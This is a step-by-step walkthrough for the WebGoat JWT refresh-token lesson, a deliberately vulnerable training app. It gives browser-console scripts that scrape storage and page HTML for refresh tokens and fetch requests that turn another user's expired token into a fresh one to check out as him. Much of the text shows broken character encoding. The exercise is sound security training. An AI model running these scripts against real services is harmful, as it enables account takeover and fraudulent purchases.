â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘             JWT REFRESH TOKEN ATTACK - ULTIMATE           â•‘
â•‘                    STEP-BY-STEP GUIDE                     â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âš ï¸ IF SECTION 2 "DOES NOTHING" - THIS FILE FIXES IT!

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ¯ THE PROBLEM:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

When you paste Section 2, you see NO OUTPUT at all.
This means one of these is happening:
1. The script has a syntax error (browser shows error in red)
2. The script runs but exits early (checks fail silently)
3. The script is async and you don't see progress

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
âœ… THE SOLUTION: USE THE ULTRA DEBUG VERSION!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Use the file: jwt_refresh_ULTRA_DEBUG.js

This version shows EVERY STEP with colored output:
- âœ“ Shows when execution starts (purple message)
- âœ“ Shows each check step-by-step
- âœ“ Shows exact reason if something fails
- âœ“ Shows the request being sent
- âœ“ Shows the response data
- âœ“ Shows success/failure clearly

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ STEP 1: FIND YOUR REFRESH TOKEN
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Open Browser Console (F12) on the WebGoat lesson page, paste:

(function() {
    console.log('%cğŸ” FINDING YOUR REFRESH TOKEN...', 'color: cyan; font-size: 16px; font-weight: bold');
    
    // Check localStorage
    console.log('\n[1/3] Checking localStorage...');
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        console.log(`  ${key}: ${value ? value.substring(0, 50) + '...' : '(empty)'}`);
        if (key.toLowerCase().includes('refresh')) {
            console.log(`  â­ FOUND! Set with: window.myRefreshToken = localStorage.getItem("${key}");`);
        }
    }
    
    // Check sessionStorage
    console.log('\n[2/3] Checking sessionStorage...');
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        console.log(`  ${key}: ${value ? value.substring(0, 50) + '...' : '(empty)'}`);
        if (key.toLowerCase().includes('refresh')) {
            console.log(`  â­ FOUND! Set with: window.myRefreshToken = sessionStorage.getItem("${key}");`);
        }
    }
    
    // Check page HTML
    console.log('\n[3/3] Checking page HTML...');
    const html = document.documentElement.innerHTML;
    const match = html.match(/refresh_token["']?\s*[:=]\s*["']?([a-zA-Z0-9\-_.]+)/i);
    if (match) {
        console.log(`  â­ FOUND in HTML: ${match[1].substring(0, 50)}...`);
        console.log(`  Set with: window.myRefreshToken = "${match[1]}";`);
    } else {
        console.log('  Not found in HTML');
    }
    
    // Try to get from server
    console.log('\n[TRYING TO GET FROM SERVER...]');
    console.log('Looking for buttons on the page...');
    const buttons = document.querySelectorAll('button');
    buttons.forEach((btn, i) => {
        const text = btn.textContent || btn.value || '';
        if (text) console.log(`  [${i}] ${text}`);
    });
    console.log('\nğŸ’¡ TIP: Click a "Login" or "Get Token" button');
    console.log('Then check Network tab (F12) for the response!');
})();

âœ… YOU SHOULD SEE:
   - List of localStorage items
   - List of sessionStorage items
   - HTML search results
   - List of buttons on the page

âš ï¸ IF YOU SEE "FOUND!", copy the command to set window.myRefreshToken

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ STEP 2: RUN ULTRA DEBUG SECTION 1
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Open jwt_refresh_ULTRA_DEBUG.js and copy SECTION 1, paste in console.

âœ… YOU SHOULD SEE (immediately):
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   [SECTION 1] SETUP STARTING...
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   âœ“ Tom's token saved to window.TOMS_EXPIRED
   Token length: 214
   âœ… SECTION 1 COMPLETE!
   
   âš ï¸ NOW DO THIS:
   window.myRefreshToken = "YOUR_ACTUAL_TOKEN_HERE";

âš ï¸ IF YOU SEE NOTHING:
   1. Check for RED error messages in console
   2. Make sure you copied the ENTIRE section including (function() {
   3. Make sure you pressed Enter after pasting

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ STEP 3: SET YOUR REFRESH TOKEN
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

In the console, type (replace with your actual token):

window.myRefreshToken = "your_actual_refresh_token_here";

Press Enter.

âœ… TO VERIFY IT'S SET:
   Type: window.myRefreshToken
   Press Enter
   You should see your token value

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ STEP 4: RUN ULTRA DEBUG SECTION 2
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Copy SECTION 2 from jwt_refresh_ULTRA_DEBUG.js, paste in console.

âœ… YOU SHOULD SEE (immediately):
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   [SECTION 2] ATTACK STARTING...
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   ğŸ” Section 2 is executing RIGHT NOW!
   
   [CHECK 1/2] Checking Tom's token...
   typeof window.TOMS_EXPIRED: string
   âœ“ PASS: Tom's token exists
   
   [CHECK 2/2] Checking your refresh token...
   typeof window.myRefreshToken: string
   âœ“ PASS: Your refresh token exists
   
   [PREPARING REQUEST]
   URL: http://192.168.254.112:8001/WebGoat/JWT/refresh/newToken
   
   [SENDING REQUEST]
   â³ Waiting for response...
   
   [RESPONSE RECEIVED]
   Status: 200 OK
   
   [PARSING RESPONSE]
   Response data: {access_token: "eyJ..."}
   âœ“ Found access_token!
   
   [SAVING TOKEN]
   âœ“ Saved to window.tomsNewToken
   
   [VERIFYING TOKEN]
   Decoded payload: {user: "Tom", ...}
   
   â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
   â•‘   âœ… SUCCESS! GOT TOM'S TOKEN!   â•‘
   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   
   ğŸš€ NOW RUN SECTION 3 TO CHECKOUT!

âš ï¸ IF YOU SEE NOTHING:
   1. Look for RED errors in console
   2. Check if checks fail (will show âŒ FAIL message)
   3. Make sure window.myRefreshToken is set
   4. Try running FIND_REFRESH_TOKEN.js again

âš ï¸ IF YOU SEE "âŒ FAIL: Your refresh token not set!":
   - Go back to STEP 3
   - Set window.myRefreshToken = "your_token"
   - Then re-run SECTION 2

âš ï¸ IF YOU SEE "âŒ REQUEST FAILED! Status: 401":
   - The refresh token might be wrong
   - Try getting a fresh one from the server
   - Click buttons on the lesson page
   - Check Network tab for new tokens

âš ï¸ IF YOU SEE "âŒ REQUEST FAILED! Status: 500":
   - Check the response body in the output
   - Might be a server-side error
   - Try refreshing the lesson page

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“‹ STEP 5: RUN ULTRA DEBUG SECTION 3
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Copy SECTION 3 from jwt_refresh_ULTRA_DEBUG.js, paste in console.

âœ… YOU SHOULD SEE:
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   [SECTION 3] CHECKOUT STARTING...
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   ğŸ” Section 3 is executing RIGHT NOW!
   
   [CHECK] Checking if Tom's new token exists...
   âœ“ PASS: Tom's new token exists
   
   [PREPARING CHECKOUT]
   URL: http://192.168.254.112:8001/WebGoat/JWT/refresh/checkout
   
   [SENDING CHECKOUT REQUEST]
   â³ Waiting for response...
   
   [CHECKOUT RESPONSE RECEIVED]
   Status: 200 OK
   
   [CHECKOUT RESULT]
   Response data: {lessonCompleted: true, ...}
   
   â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
   â•‘  ğŸ‰ CHALLENGE COMPLETE! TOM PAID FOR BOOKS!  â•‘
   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   
   ğŸ† JWT REFRESH TOKEN ATTACK SUCCESSFUL!

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â“ TROUBLESHOOTING: "NOTHING HAPPENS" WHEN PASTING
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

If you paste a section and see ABSOLUTELY NOTHING (not even an error):

1. CHECK FOR SYNTAX ERRORS:
   - Look at the console - any RED messages?
   - Try pasting just the first line: (function() {
   - If that shows an error, the script is broken

2. CHECK IF CONSOLE IS FROZEN:
   - Press Ctrl+L to clear console
   - Type: console.log("test")
   - Press Enter
   - If you don't see "test", your console is broken

3. CHECK IF SCRIPT IS TOO LONG:
   - Some browsers have paste limits
   - Solution: Use the script files instead
   - Or paste smaller sections

4. VERIFY YOU'RE ON THE RIGHT PAGE:
   - URL should be: http://192.168.254.112:8001/WebGoat/JWT
   - You should see "Refreshing a token" lesson
   - If you're on a different page, the scripts won't work

5. TRY A SIMPLER TEST:
   Paste this simple test:
   
   (function() {
       console.log('%cğŸ¯ TEST SUCCESSFUL!', 'color: green; font-size: 20px; font-weight: bold');
       console.log('If you see this, your console is working!');
       console.log('Now try the actual scripts.');
   })();
   
   If you see "TEST SUCCESSFUL!", the console works.
   If not, your browser console might be broken.

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ BONUS: ONE-LINER TO GET REFRESH TOKEN FROM SERVER
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Paste this to try getting a refresh token directly:

fetch("/WebGoat/JWT/refresh/login", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({user: "Jerry"})}).then(r => r.json()).then(d => {console.log("Response:", d); if(d.refresh_token) {window.myRefreshToken = d.refresh_token; console.log("%câœ… Got refresh token!", "color: green; font-weight: bold"); console.log("Set to: window.myRefreshToken");} else {console.log("%câš ï¸ No refresh_token in response", "color: orange");}});

âš ï¸ This might fail with 401 if the endpoint needs initialization.
   In that case, click buttons on the lesson page first.

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“ FILES TO USE:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ… BEST: jwt_refresh_ULTRA_DEBUG.js
   - Shows MAXIMUM detail
   - Every step has output
   - Easy to see what's happening
   - Easy to debug issues

âœ… ALSO GOOD: jwt_refresh_GUARANTEED_OUTPUT.js
   - Similar to ULTRA_DEBUG
   - Slightly less verbose

âœ… FOR FINDING TOKEN: FIND_REFRESH_TOKEN.js
   - Searches everywhere for refresh token
   - Tries multiple methods
   - Shows detailed results

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ†˜ STILL STUCK? MANUAL VERIFICATION:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

If automated scripts don't work, verify manually:

1. VERIFY TOM'S TOKEN IS SET:
   console.log(window.TOMS_EXPIRED);
   
   Should show: eyJhbGciOiJIUzUxMiJ9.eyJpYXQi...

2. VERIFY YOUR REFRESH TOKEN IS SET:
   console.log(window.myRefreshToken);
   
   Should show: your actual refresh token

3. MANUAL REQUEST:
   fetch('/WebGoat/JWT/refresh/newToken', {
       method: 'POST',
       headers: {
           'Authorization': 'Bearer ' + window.TOMS_EXPIRED,
           'Content-Type': 'application/json'
       },
       body: JSON.stringify({refresh_token: window.myRefreshToken})
   }).then(r => r.json()).then(d => {
       console.log('Response:', d);
       if (d.access_token) {
           window.tomsNewToken = d.access_token;
           console.log('âœ… Got Tom\'s new token!');
       }
   });

4. MANUAL CHECKOUT:
   fetch('/WebGoat/JWT/refresh/checkout', {
       method: 'POST',
       headers: {
           'Authorization': 'Bearer ' + window.tomsNewToken,
           'Content-Type': 'application/json'
       }
   }).then(r => r.json()).then(d => {
       console.log('Checkout result:', d);
   });

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
âœ… SUCCESS CHECKLIST:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â–¡ Found your refresh token
â–¡ Set window.myRefreshToken = "..."
â–¡ Ran SECTION 1 â†’ Saw "SECTION 1 COMPLETE!"
â–¡ Ran SECTION 2 â†’ Saw "SUCCESS! GOT TOM'S TOKEN!"
â–¡ Ran SECTION 3 â†’ Saw "CHALLENGE COMPLETE!"
â–¡ WebGoat shows green checkmark on lesson
â–¡ Tom paid $31.53 for books! ğŸ‰

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
